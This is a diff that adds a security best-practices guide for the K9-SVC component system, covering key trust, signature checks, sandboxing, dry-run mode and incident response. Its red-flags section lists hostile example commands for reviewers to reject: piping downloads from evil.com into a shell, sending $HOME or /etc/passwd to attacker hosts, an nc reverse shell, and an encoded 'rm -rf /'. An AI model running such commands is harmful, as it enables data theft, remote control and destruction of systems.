@@ -1,0 +1,1112 @@
+// SPDX-License-Identifier: PMPL-1.0-or-later
+= K9-SVC: Security Best Practices
+:subtitle: How to Use K9 Components Safely
+:author: Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk>
+:revdate: 2026-01-30
+:toc: left
+:icons: font
+
+[NOTE]
+====
+**Audience:** K9 users and component authors
+
+**Related Documentation:**
+
+- link:../SECURITY.md[SECURITY.md] - Vulnerability reporting policy
+- link:SECURITY-FAQ.adoc[SECURITY-FAQ.adoc] - Common security questions
+- link:SECURITY-ROADMAP.adoc[SECURITY-ROADMAP.adoc] - Security implementation timeline
+- link:SECURITY-FOR-DECISION-MAKERS.adoc[SECURITY-FOR-DECISION-MAKERS.adoc] - Executive summary
+- link:../SECURITY-SOLUTIONS-VS-MITIGATIONS.adoc[SECURITY-SOLUTIONS-VS-MITIGATIONS.adoc] - Technical analysis
+====
+
+---
+
+== General Principles
+
+=== Defense in Depth
+
+**Never rely on a single security mechanism.**
+
+K9 provides multiple security layers:
+
+1. **Security levels** (Kennel/Yard/Hunt)
+2. **Digital signatures** (Ed25519)
+3. **Nickel contracts** (runtime validation)
+4. **Dry-run mode** (preview before execution)
+5. **k9-scan** (static analysis - coming soon)
+6. **Sandboxing** (optional, recommended for Hunt)
+
+**Best Practice:** Use all applicable layers for your security level.
+
+=== Least Privilege
+
+**Only use the minimum security level required.**
+
+[cols="2,3,3"]
+|===
+| Level | Use For | Avoid For
+
+| **Kennel**
+| Configuration data, build settings, tool configs
+| Anything requiring external commands
+
+| **Yard**
+| Local file operations, data transformation
+| System modification, network access
+
+| **Hunt**
+| Full deployments, system configuration
+| Routine tasks, untrusted sources
+|===
+
+**Best Practice:** Default to Kennel, escalate only when necessary.
+
+=== Zero Trust
+
+**Treat all components as untrusted until verified.**
+
+Even if a component is signed by a trusted key:
+
+- **Inspect the signature** - verify fingerprint matches published value
+- **Review the Nickel code** - understand what it does
+- **Run in dry-run mode first** - see what would execute
+- **Check the Just recipes** - audit all system commands
+
+**Best Practice:** Trust is earned through verification, not assumed from signatures.
+
+---
+
+== Key Management
+
+=== Trusting Public Keys
+
+**⚠️ CRITICAL: Trusting a key grants full system access for Hunt components.**
+
+==== Initial Trust Ceremony
+
+When adding a new public key to your trusted set:
+
+[source,bash]
+----
+# 1. Get the public key from multiple independent sources
+curl https://keys.k9.example.com/author.pub > author.pub
+curl https://github.com/author/keys/author.pub > author-gh.pub
+dig TXT keys.author.example.com  # DNS TXT record with fingerprint
+
+# 2. Verify all copies match
+sha256sum author.pub author-gh.pub
+# All hashes must be identical
+
+# 3. Display and verify the fingerprint
+openssl pkey -pubin -in author.pub -text -noout | grep -A 5 "Public-Key"
+
+# 4. Out-of-band verification (if possible)
+# - Video call with key holder showing fingerprint
+# - Keybase proof chain
+# - PGP web of trust
+
+# 5. Document the trust decision
+echo "$(date -Iseconds) - Trusted author.pub - verified via 3 sources + video call" \
+    >> ~/.k9/trust-log.txt
+
+# 6. Add to trusted keys
+mkdir -p ~/.k9/trusted-keys
+cp author.pub ~/.k9/trusted-keys/
+chmod 600 ~/.k9/trusted-keys/author.pub
+----
+
+==== Multi-Factor Key Verification
+
+For production deployments, require **at least 3 independent verification sources**:
+
+1. **Visual verification** - Fingerprint display matches published value
+2. **Network verification** - DNS TXT record or HTTPS endpoint
+3. **Out-of-band verification** - Direct communication with key holder
+
+**Never trust based on:**
+
+- Single source (just GitHub, just website)
+- Email attachment (could be MITM'd)
+- Slack/Discord message (accounts get compromised)
+- "Trust me" statements
+
+==== Key Revocation
+
+**Check for revoked keys before each use:**
+
+[source,bash]
+----
+# Manual check
+curl https://keys.k9.example.com/revoked.txt | grep "$(sha256sum ~/.k9/trusted-keys/author.pub | cut -d' ' -f1)"
+
+# Automated check (add to wrapper script)
+if curl -sf https://keys.k9.example.com/revoked.txt | grep -q "$(sha256sum $pubkey | cut -d' ' -f1)"; then
+    echo "ERROR: Key $pubkey has been REVOKED"
+    exit 1
+fi
+----
+
+**If a key is revoked:**
+
+1. Remove immediately from `~/.k9/trusted-keys/`
+2. Audit all components signed with that key
+3. Re-verify components with alternate signatures (if available)
+4. Report incident if malicious use suspected
+
+=== Protecting Your Private Keys
+
+If you sign K9 components, protect your private keys:
+
+==== Storage
+
+**Development keys:**
+```bash
+# Password-protected, stored in secure location
+openssl genpkey -algorithm ED25519 -out ~/.k9/signing-key.pem -aes256
+chmod 600 ~/.k9/signing-key.pem
+```
+
+**Production keys:**
+```
+MUST use hardware security modules (HSM) or hardware tokens:
+- YubiKey (USB token, $50-80)
+- Nitrokey (USB token, $50-100)
+- AWS CloudHSM (cloud HSM, $1.60/hour)
+- Azure Key Vault (cloud HSM, ~$2/month)
+```
+
+**Why hardware?**
+
+- Private key never leaves the device (no software theft possible)
+- Physical access required (can't be stolen over network)
+- Tamper-resistant (physical security)
+
+**Never:**
+
+- ❌ Store unencrypted keys on disk
+- ❌ Commit keys to version control
+- ❌ Share keys via email/Slack/Discord
+- ❌ Store keys in cloud storage (Dropbox, Google Drive)
+
+==== Key Rotation
+
+**Rotate signing keys regularly:**
+
+- **Development keys:** Every 6 months
+- **Production keys:** Every 12 months
+- **After compromise:** Immediately
+
+**Rotation procedure:**
+
+```bash
+# 1. Generate new key
+openssl genpkey -algorithm ED25519 -out new-signing-key.pem -aes256
+
+# 2. Publish new public key
+openssl pkey -in new-signing-key.pem -pubout -out new-signing-key.pub
+# Upload to https://keys.k9.example.com/author-2026.pub
+
+# 3. Sign components with both keys (90-day transition)
+./must sign component.k9.ncl --key old-signing-key.pem
+./must sign component.k9.ncl --key new-signing-key.pem
+
+# 4. After transition period, revoke old key
+echo "$(sha256sum old-signing-key.pub | cut -d' ' -f1) - Rotated 2026-01-30" \
+    >> https://keys.k9.example.com/revoked.txt
+
+# 5. Securely delete old key
+shred -vfz -n 10 old-signing-key.pem
+```
+
+---
+
+== Component Verification
+
+=== Before Running Any Component
+
+**Follow this checklist EVERY TIME:**
+
+```bash
+# 1. Verify signature (REQUIRED)
+./must verify component.k9.ncl
+# Must see: "✓ Valid signature from [trusted key]"
+
+# 2. Inspect Nickel code (REQUIRED for Yard/Hunt)
+cat component.k9.ncl
+# Look for:
+# - What files does it read/write?
+# - What commands does it run?
+# - Does it access network?
+# - Are there any suspicious patterns?
+
+# 3. Check Just recipes (REQUIRED for Yard/Hunt)
+just --list --justfile component.k9.ncl
+# Review all recipes that will execute
+
+# 4. Dry-run mode (REQUIRED for Hunt, RECOMMENDED for Yard)
+./must --dry-run deploy component.k9.ncl
+# Read all output carefully
+# Verify no unexpected file modifications or commands
+
+# 5. Run in sandbox (REQUIRED for Hunt from untrusted sources)
+# See "Sandboxing" section below
+```
+
+**If ANY step fails or looks suspicious:**
+
+1. **STOP immediately**
+2. Do not proceed with execution
+3. Report to component author
+4. If potentially malicious, report to SECURITY.md contacts
+
+=== Red Flags to Watch For
+
+When reviewing K9 components, these patterns are **highly suspicious**:
+
+==== Suspicious File Operations
+
+```nickel
+# ❌ Accessing sensitive system files
+file_path = "/etc/shadow"
+file_path = "/etc/sudoers"
+file_path = "/root/.ssh/id_rsa"
+
+# ❌ Writing to unexpected locations
+output = "/usr/bin/malware"
+output = "/etc/cron.d/backdoor"
+output = "$HOME/.bashrc"  # unless component explicitly states it modifies shell config
+```
+
+==== Suspicious Commands
+
+```nickel
+# ❌ Downloading and executing code
+command = "curl https://evil.com/script.sh | bash"
+command = "wget -O- https://evil.com/install | sh"
+
+# ❌ Privilege escalation
+command = "sudo rm -rf /var/log/*"
+command = "chmod +s /bin/bash"
+
+# ❌ Persistence mechanisms
+command = "crontab -e"
+command = "systemctl enable malware.service"
+
+# ❌ Data exfiltration
+command = "tar -czf - $HOME | curl -X POST -d @- https://evil.com/upload"
+command = "cat /etc/passwd | nc attacker.com 4444"
+
+# ❌ Disabling security
+command = "systemctl stop firewalld"
+command = "setenforce 0"
+command = "iptables -F"
+```
+
+==== Obfuscation
+
+```nickel
+# ❌ Base64 encoding (hiding commands)
+command = "echo 'cm0gLXJmIC8=' | base64 -d | sh"
+
+# ❌ Hex encoding
+command = "\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f"
+
+# ❌ String concatenation to hide keywords
+let cmd1 = "rm " in
+let cmd2 = "-rf " in
+let cmd3 = "/" in
+command = cmd1 ++ cmd2 ++ cmd3
+```
+
+==== Network Access (Unexpected)
+
+```nickel
+# ❌ Unless component purpose is networking
+command = "nc -lvp 4444 -e /bin/bash"  # Reverse shell
+command = "nohup python3 -m http.server 8000 &"  # Unauthorized HTTP server
+```
+
+**If you see ANY of these patterns:**
+
+- **REJECT the component immediately**
+- **Do not run even in dry-run mode** (some exploits can trigger on parse)
+- **Report to component author and K9 maintainers**
+- **Warn others in community channels**
+
+---
+
+== Security Levels
+
+=== Kennel: Pure Data
+
+**Security posture:** Lowest risk, configuration data only.
+
+**What it can do:**
+
+- Define configuration values
+- Validate data with Nickel contracts
+- Export configuration as JSON
+
+**What it CANNOT do:**
+
+- Execute system commands
+- Read/write files
+- Access network
+- Modify system state
+
+**Best practices:**
+
+```nickel
+# ✅ Good Kennel use
+K9!
+leash = 'Kennel
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "database-config"
+}
+
+config = {
+  host = "localhost",
+  port | std.number.Positive = 5432,
+  database | std.string.NonEmpty = "myapp",
+  max_connections = 100
+}
+```
+
+**Trust level:** Can use from any source (even unsigned) if you review the Nickel.
+
+=== Yard: Local Operations
+
+**Security posture:** Medium risk, local file access.
+
+**What it can do:**
+
+- Read/write files in controlled locations
+- Template generation
+- Data transformation
+- Local validation
+
+**What it CANNOT do:**
+
+- Execute arbitrary system commands
+- Access network
+- Modify system configuration
+- Install software
+
+**Best practices:**
+
+```nickel
+# ✅ Good Yard use - controlled file output
+K9!
+leash = 'Yard
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "nginx-config-generator"
+}
+
+config = {
+  server_name = "example.com",
+  document_root = "/var/www/html"
+}
+
+outputs = {
+  "nginx.conf" = {
+    path = "./generated/nginx.conf",
+    content = "server { server_name %{config.server_name}; }"
+  }
+}
+```
+
+```bash
+# ✅ Review outputs before deploying
+./must --dry-run generate nginx-config.k9.ncl
+cat generated/nginx.conf  # Verify output before copying to /etc/nginx/
+```
+
+**Trust level:** Require signature from trusted key. Review file paths in dry-run.
+
+=== Hunt: Full System Access
+
+**Security posture:** Highest risk, complete system control.
+
+**What it can do:**
+
+- EVERYTHING (full Just recipe execution)
+- Install software
+- Modify system configuration
+- Start/stop services
+- Network access
+- Anything `root` can do (if run as root)
+
+**What it CANNOT do:**
+
+- Nothing (no restrictions)
+
+**Best practices:**
+
+```bash
+# ✅ ALWAYS verify signature
+./must verify deployment.k9.ncl
+
+# ✅ ALWAYS review Just recipes
+just --list --justfile deployment.k9.ncl
+cat deployment.k9.ncl | grep -A 20 "^\[deploy\]"
+
+# ✅ ALWAYS dry-run first
+./must --dry-run deploy deployment.k9.ncl
+
+# ✅ NEVER run as root (unless absolutely required)
+if [ "$(id -u)" -eq 0 ]; then
+    echo "ERROR: Refusing to run Hunt component as root"
+    exit 1
+fi
+
+# ✅ ALWAYS sandbox when possible (see below)
+```
+
+**Trust level:**
+
+- **Absolute trust required** - signature MUST be from highly trusted key
+- **Multi-source verification** - verify key from 3+ independent sources
+- **Audit first** - read every line of Just recipes
+- **Sandbox recommended** - see next section
+
+---
+
+== Sandboxing
+
+**⚠️ CRITICAL for Hunt components from external sources.**
+
+=== Docker Sandbox
+
+**Recommended for Hunt components:**
+
+```bash
+# Create isolated container
+docker run -it --rm \
+  --network none \
+  --read-only \
+  --tmpfs /tmp \
+  -v "$(pwd)/component.k9.ncl:/work/component.k9.ncl:ro" \
+  debian:bookworm-slim \
+  bash
+
+# Inside container
+cd /work
+./must deploy component.k9.ncl
+```
+
+**Restrictions:**
+
+- No network access (`--network none`)
+- Read-only filesystem (`--read-only`)
+- Temporary files only (`--tmpfs /tmp`)
+- Component file read-only (`:ro`)
+
+**Breakout risk:** Docker isolation is not perfect, but significantly reduces risk.
+
+=== Firejail Sandbox
+
+**Lightweight alternative:**
+
+```bash
+# Install firejail
+sudo dnf install firejail  # Fedora
+sudo apt install firejail  # Debian/Ubuntu
+
+# Run with strong isolation
+firejail \
+  --noprofile \
+  --net=none \
+  --private \
+  --read-only=~ \
+  ./must deploy component.k9.ncl
+```
+
+**Restrictions:**
+
+- No network (`--net=none`)
+- Private /home (`--private`)
+- Read-only home directory (`--read-only=~`)
+
+=== systemd Service Sandboxing
+
+**For production deployments:**
+
+```ini
+# /etc/systemd/system/k9-deploy.service
+[Unit]
+Description=K9 Component Deployment
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/must deploy /etc/k9/component.k9.ncl
+
+# Sandboxing
+NoNewPrivileges=yes
+PrivateTmp=yes
+ProtectSystem=strict
+ProtectHome=yes
+ReadOnlyPaths=/
+ReadWritePaths=/var/lib/myapp
+ProtectKernelModules=yes
+ProtectKernelTunables=yes
+RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
+RestrictNamespaces=yes
+RestrictRealtime=yes
+SystemCallFilter=@system-service
+SystemCallErrorNumber=EPERM
+
+[Install]
+WantedBy=multi-user.target
+```
+
+**Restrictions:**
+
+- Cannot gain privileges (`NoNewPrivileges`)
+- Isolated /tmp (`PrivateTmp`)
+- Read-only system (`ProtectSystem=strict`)
+- Minimal syscalls (`SystemCallFilter`)
+
+---
+
+== Dry-Run Mode
+
+**ALWAYS use dry-run before first execution of Yard/Hunt components.**
+
+=== What Dry-Run Does
+
+```bash
+./must --dry-run deploy component.k9.ncl
+```
+
+**Output shows:**
+
+1. **Nickel evaluation result** (configuration after validation)
+2. **Just recipes that would execute** (but don't actually run)
+3. **Files that would be created/modified** (but aren't touched)
+4. **Commands that would run** (printed, not executed)
+
+**Example output:**
+
+```
+K9 Dry-Run Mode
+===============
+Component: component.k9.ncl
+Security Level: Hunt
+Signature: ✓ Valid (sha256:abc123...)
+
+Configuration (after Nickel eval):
+{
+  "database": {
+    "host": "localhost",
+    "port": 5432
+  }
+}
+
+Just recipes that would execute:
+  [install-deps]
+    apt-get update && apt-get install -y postgresql-client
+
+  [deploy]
+    pg_restore -h localhost -p 5432 -d myapp backup.sql
+
+Files that would be modified:
+  - /etc/myapp/config.json (CREATE)
+  - /var/log/myapp/deploy.log (APPEND)
+
+⚠️  DRY-RUN MODE - Nothing was actually executed
+To run for real: ./must deploy component.k9.ncl
+```
+
+=== Dry-Run Limitations
+
+**⚠️ Dry-run is NOT perfect:**
+
+- **Logic bombs** - malicious code can detect dry-run and hide
+- **Parse-time exploits** - Nickel evaluation happens even in dry-run
+- **Side effects** - some Just built-ins may execute (file checks, etc.)
+
+**Do not rely on dry-run alone - also review code manually.**
+
+---
+
+== Running as Non-Root
+
+**⚠️ NEVER run K9 components as `root` unless absolutely required.**
+
+=== Why Root is Dangerous
+
+If a malicious Hunt component runs as root:
+
+- **Full system compromise** - can install rootkits, modify kernel
+- **Persistence** - can create backdoor accounts, cron jobs
+- **Data theft** - can access all users' files
+- **Destruction** - can wipe entire system
+
+**Even with signatures, running as root is risky** - compromised signing key = root access.
+
+=== Root Detection
+
+**Refuse to run as root by default:**
+
+```bash
+#!/bin/bash
+# Wrapper script: k9-safe
+
+if [ "$(id -u)" -eq 0 ]; then
+    echo "ERROR: K9 refuses to run as root for security."
+    echo "Run as a regular user, or use --allow-root flag if absolutely required."
+    exit 1
+fi
+
+./must "$@"
+```
+
+**Allow root with explicit confirmation:**
+
+```bash
+if [ "$1" = "--allow-root" ] && [ "$(id -u)" -eq 0 ]; then
+    read -p "⚠️  You are running K9 as ROOT. Type 'I understand the risks' to continue: " response
+    if [ "$response" != "I understand the risks" ]; then
+        echo "Aborted."
+        exit 1
+    fi
+    shift  # Remove --allow-root from args
+fi
+```
+
+=== Privilege Dropping
+
+**If root is required for setup, drop privileges afterward:**
+
+```bash
+# In Just recipe
+[setup]
+  # Run as root to bind privileged port
+  @if [ "$(id -u)" -eq 0 ]; then \
+    echo "Binding port 443..."; \
+    setcap cap_net_bind_service=+ep /usr/local/bin/myapp; \
+  fi
+
+[deploy]
+  # Drop to unprivileged user
+  @sudo -u appuser /usr/local/bin/myapp start
+```
+
+**Linux capabilities** (preferred over full root):
+
+```bash
+# Grant only specific capabilities
+sudo setcap cap_net_bind_service,cap_net_raw=+ep /usr/local/bin/myapp
+
+# Now runs as non-root but can bind port 80/443
+/usr/local/bin/myapp
+```
+
+---
+
+== Component Authoring
+
+**If you write K9 components that others will use:**
+
+=== Principle of Least Astonishment
+
+**Your component should do exactly what users expect, nothing more.**
+
+❌ **Bad:**
+
+```nickel
+# Component claims to be "nginx config generator"
+# But also installs packages and modifies firewall
+
+K9!
+leash = 'Hunt
+
+pedigree = {
+  component_type = "nginx-config-generator"  # Misleading!
+}
+
+[install-deps]
+  apt-get install -y nginx
+  ufw allow 80/tcp
+  ufw allow 443/tcp
+
+[deploy]
+  cp nginx.conf /etc/nginx/
+  systemctl restart nginx
+```
+
+✅ **Good:**
+
+```nickel
+# Be explicit about what component does
+K9!
+leash = 'Hunt
+
+pedigree = {
+  component_type = "nginx-full-deployment"
+  description = "Installs nginx, configures firewall, and deploys config"
+  # Clear expectations
+}
+
+[install-deps]
+  @echo "Installing nginx package..."
+  apt-get install -y nginx
+
+[configure-firewall]
+  @echo "Opening ports 80 and 443..."
+  ufw allow 80/tcp
+  ufw allow 443/tcp
+
+[deploy]
+  @echo "Deploying nginx.conf..."
+  cp nginx.conf /etc/nginx/
+  nginx -t  # Test config before restart
+  systemctl restart nginx
+```
+
+**Better:** Split into multiple components (separation of concerns):
+
+- `nginx-install.k9.ncl` (Hunt) - installs package
+- `nginx-firewall.k9.ncl` (Hunt) - configures firewall
+- `nginx-config.k9.ncl` (Yard) - generates config file
+
+Users compose as needed.
+
+=== Clear Documentation
+
+**Every component MUST have:**
+
+```nickel
+K9!
+leash = 'Hunt
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "database-backup",
+
+  # What does this component do?
+  description = "Backs up PostgreSQL database to local filesystem",
+
+  # What security level and why?
+  security_level_rationale = "Hunt required for pg_dump execution",
+
+  # What system changes will it make?
+  side_effects = [
+    "Creates backup file at /var/backups/db/",
+    "Reads database credentials from /etc/myapp/db.conf",
+    "Appends log entry to /var/log/myapp/backup.log"
+  ],
+
+  # What privileges required?
+  required_privileges = "Read access to /etc/myapp/db.conf, write to /var/backups/db/",
+
+  # Any risks users should know about?
+  warnings = [
+    "Backup file contains unencrypted database dump",
+    "Requires database user with SELECT privileges"
+  ]
+}
+```
+
+=== Minimal Scope
+
+**Only include what's necessary for the component's purpose:**
+
+❌ **Bad - scope creep:**
+
+```nickel
+# A "config file generator" shouldn't install packages
+K9!
+leash = 'Hunt
+
+[install-python]
+  apt-get install -y python3  # Why?
+
+[generate-config]
+  python3 generate.py > config.json  # Could be pure Nickel
+```
+
+✅ **Good - minimal scope:**
+
+```nickel
+# Pure Nickel for config generation (no Hunt needed)
+K9!
+leash = 'Kennel  # Downgraded from Hunt
+
+config = {
+  database = {
+    host = "localhost",
+    port = 5432
+  }
+}
+
+# Output as JSON
+std.serialize 'Json config
+```
+
+=== Avoid Implicit Trust
+
+**Never assume users trust external resources:**
+
+❌ **Bad:**
+
+```nickel
+[download-script]
+  curl https://install.example.com/setup.sh | bash  # User has no control
+```
+
+✅ **Good:**
+
+```nickel
+[download-script]
+  # 1. Download
+  curl -o setup.sh https://install.example.com/setup.sh
+
+  # 2. Verify checksum
+  echo "abc123...  setup.sh" | sha256sum -c
+
+  # 3. Let user inspect before execution
+  @echo "Downloaded setup.sh - please review before continuing"
+  @echo "To proceed: bash setup.sh"
+```
+
+**Even better:** Vendor the script in the component itself (no download).
+
+=== Graceful Degradation
+
+**Component should work in dry-run mode:**
+
+```nickel
+[deploy]
+  #!/bin/bash
+  if [ "$K9_DRY_RUN" = "true" ]; then
+    echo "[DRY-RUN] Would copy config.json to /etc/myapp/"
+    echo "[DRY-RUN] Would restart myapp.service"
+  else
+    cp config.json /etc/myapp/
+    systemctl restart myapp.service
+  fi
+```
+
+**K9 should set `K9_DRY_RUN=true` environment variable** (future enhancement).
+
+---
+
+== Incident Response
+
+=== If You Suspect Compromise
+
+**Follow these steps immediately:**
+
+1. **STOP using the component**
+   ```bash
+   # Remove from systems
+   systemctl stop malicious-component.service
+   systemctl disable malicious-component.service
+   ```
+
+2. **Revoke trust in signing key**
+   ```bash
+   rm ~/.k9/trusted-keys/compromised-key.pub
+   ```
+
+3. **Audit what the component did**
+   ```bash
+   # Check logs
+   journalctl -u malicious-component.service
+   cat /var/log/syslog | grep malicious-component
+
+   # Check files modified
+   find / -newermt "2026-01-30 14:00" -ls  # Replace with execution time
+
+   # Check processes spawned
+   ps aux | grep malicious
+   ```
+
+4. **Report to K9 maintainers**
+   - Email: security@k9-svc.org (not yet active, use GitHub Security)
+   - GitHub: https://github.com/hyperpolymath/k9-svc/security/advisories/new
+   - Include: component file, signature, observed behavior
+
+5. **Warn the community**
+   - Post in K9 discussions/Discord/Slack
+   - Include SHA-256 hash of component
+   - Describe malicious behavior observed
+
+6. **Containment**
+   - Isolate affected systems from network
+   - Preserve evidence (disk images, memory dumps)
+   - Consider full system reinstall if root compromise
+
+---
+
+== Security Checklist
+
+**Before running ANY K9 component:**
+
+- [ ] Signature verified with `./must verify`
+- [ ] Signing key verified from 3+ independent sources
+- [ ] Nickel code reviewed (no suspicious patterns)
+- [ ] Just recipes reviewed (no dangerous commands)
+- [ ] Dry-run executed and output reviewed
+- [ ] Running as non-root user (or --allow-root confirmed)
+- [ ] Sandboxing enabled (for Hunt from external sources)
+- [ ] Component purpose matches documentation
+- [ ] Recent backup exists (in case of disaster)
+
+**Before trusting a new signing key:**
+
+- [ ] Fingerprint verified from 3+ sources
+- [ ] Out-of-band confirmation (video call, Keybase, PGP)
+- [ ] Trust decision documented in trust log
+- [ ] Key added to `~/.k9/trusted-keys/` with chmod 600
+
+**When authoring K9 components:**
+
+- [ ] Minimal security level used (Kennel > Yard > Hunt)
+- [ ] Clear documentation in pedigree section
+- [ ] Side effects explicitly listed
+- [ ] No scope creep (component does one thing)
+- [ ] Graceful dry-run mode support
+- [ ] No implicit trust in external resources
+
+---
+
+== Tools and Automation
+
+=== k9-safe Wrapper Script
+
+**Create a safer K9 wrapper:**
+
+```bash
+#!/bin/bash
+# ~/.local/bin/k9-safe
+# Enforces security best practices
+
+set -euo pipefail
+
+COMPONENT="$1"
+shift
+ARGS="$@"
+
+# 1. Refuse to run as root
+if [ "$(id -u)" -eq 0 ]; then
+    echo "❌ ERROR: k9-safe refuses to run as root."
+    echo "Run as a regular user."
+    exit 1
+fi
+
+# 2. Verify signature
+echo "🔍 Verifying signature..."
+if ! ./must verify "$COMPONENT"; then
+    echo "❌ Signature verification FAILED"
+    exit 1
+fi
+echo "✅ Signature valid"
+
+# 3. Display component info
+echo "📋 Component information:"
+nickel eval "$COMPONENT" | jq '.pedigree'
+
+# 4. Offer dry-run
+read -p "Run in dry-run mode first? [Y/n] " response
+if [ "$response" != "n" ]; then
+    echo "🏃 Dry-run mode:"
+    ./must --dry-run $ARGS "$COMPONENT"
+
+    read -p "Dry-run complete. Proceed with actual execution? [y/N] " response
+    if [ "$response" != "y" ]; then
+        echo "Aborted."
+        exit 0
+    fi
+fi
+
+# 5. Execute
+echo "▶️  Executing component..."
+./must $ARGS "$COMPONENT"
+```
+
+Usage:
+
+```bash
+k9-safe deployment.k9.ncl deploy
+```
+
+=== Trust Log Automation
+
+**Track all trust decisions:**
+
+```bash
+#!/bin/bash
+# ~/.local/bin/k9-trust
+# Adds a key to trusted set with logging
+
+set -euo pipefail
+
+KEY_FILE="$1"
+TRUST_DIR="$HOME/.k9/trusted-keys"
+LOG_FILE="$HOME/.k9/trust-log.txt"
+
+# Verify key is valid Ed25519 public key
+if ! openssl pkey -pubin -in "$KEY_FILE" -text -noout | grep -q "ED25519"; then
+    echo "❌ Not a valid Ed25519 public key"
+    exit 1
+fi
+
+# Display fingerprint
+echo "Fingerprint:"
+openssl pkey -pubin -in "$KEY_FILE" -text -noout | grep -A 5 "Public-Key"
+
+# Confirm trust
+read -p "Trust this key? [y/N] " response
+if [ "$response" != "y" ]; then
+    echo "Aborted."
+    exit 0
+fi
+
+# Ask for verification sources
+read -p "How did you verify this key? (e.g., 'GitHub + website + video call'): " sources
+
+# Add to trusted keys
+mkdir -p "$TRUST_DIR"
+cp "$KEY_FILE" "$TRUST_DIR/"
+chmod 600 "$TRUST_DIR/$(basename $KEY_FILE)"
+
+# Log decision
+echo "$(date -Iseconds) - Trusted $(basename $KEY_FILE) - verified via: $sources" >> "$LOG_FILE"
+
+echo "✅ Key trusted and logged"
+```
+
+Usage:
+
+```bash
+k9-trust author.pub
+```
+
+---
+
+== Additional Resources
+
+- **SECURITY.md** - Vulnerability reporting policy
+- **SECURITY-FAQ.adoc** - Common security questions answered
+- **SECURITY-ROADMAP.adoc** - Planned security improvements
+- **SECURITY-FOR-DECISION-MAKERS.adoc** - Executive summary for managers
+- **SECURITY-SOLUTIONS-VS-MITIGATIONS.adoc** - Technical risk analysis
+
+**External Resources:**
+
+- OWASP Secure Coding Practices: https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/
+- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
+- CIS Security Benchmarks: https://www.cisecurity.org/cis-benchmarks
+
+---
+
+**Maintainer:** Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk> +
+**Last Updated:** 2026-01-30 +
+**Next Review:** After Tier 1 security implementation
